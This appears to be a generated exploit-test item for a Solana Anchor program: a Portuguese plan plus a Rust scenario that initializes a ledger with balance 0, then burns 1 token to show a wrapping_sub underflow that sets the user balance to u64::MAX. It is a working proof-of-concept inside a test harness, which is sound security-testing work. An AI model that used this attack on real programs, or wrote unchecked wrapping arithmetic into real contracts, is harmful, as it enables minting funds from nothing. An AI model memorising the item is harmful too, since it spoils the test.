{
  "plan": "Inicializa uma conta Ledger com total_supply=100 e user_balance=0 via instrucao initialize (baseline). Em seguida, chama burn com amount=1, que e maior que user_balance=0, para testar underflow. O ataque usa wrapping_sub, entao user_balance e total_supply devem dar a volta para u64::MAX e 99 respectivamente, em vez de falhar. O efeito mede se user_balance resultante e u64::MAX (underflow) e total_supply e 99, demonstrando o dano.",
  "scenario": "let authority = Pubkey::new_unique();
let ledger_key = Pubkey::new_unique();

// Conta ledger ainda nao criada (init)
let ledger_account = empty_account();
let authority_account = wallet(1_000_000_000);
let (system_program_id, system_program_account) = system_program_account();

// Baseline: initialize com initial_supply = 100
let ix_init = env.anchor_ix(
    "initialize",
    &(100u64,),
    vec![
        AccountMeta::new(ledger_key, true),
        AccountMeta::new(authority, true),
        AccountMeta::new_readonly(system_program_id, false),
    ],
);
let contas_init = vec![
    (ledger_key, ledger_account),
    (authority, authority_account),
    (system_program_id, system_program_account),
];
let r_init = env.baseline("initialize ledger com supply 100", &ix_init, &contas_init);

// Extrai a conta ledger resultante do baseline
let ledger_after_init = r_init
    .resulting_accounts
    .iter()
    .find(|(k, _)| *k == ledger_key)
    .map(|(_, a)| a.clone())
    .unwrap_or_else(|| account(&env.program_id, &anchor_account_data("Ledger", &(authority, 100u64, 0u64)), None));

// Ataque: burn com amount = 1, maior que user_balance = 0
let ix_attack = env.anchor_ix(
    "burn",
    &(1u64,),
    vec![
        AccountMeta::new(ledger_key, false),
        AccountMeta::new_readonly(authority, true),
    ],
);
let contas_attack = vec![
    (ledger_key, ledger_after_init),
    (authority, wallet(1_000_000_000)),
];
let r_attack = env.attack("burn 1 com saldo 0 (underflow)", &ix_attack, &contas_attack);

if r_attack.program_result == ProgramResult::Success {
    let ledger_data = after(&r_attack, &ledger_key).data();
    // Layout: 8 bytes discriminador + 32 authority + 8 total_supply + 8 user_balance
    let total_supply = read_u64(ledger_data, 40);
    let user_balance = read_u64(ledger_data, 48);
    env.effect(
        "user_balance deu underflow para u64::MAX",
        user_balance == u64::MAX,
    );
    env.effect(
        "total_supply deu underflow para 99",
        total_supply == 99,
    );
}"
}

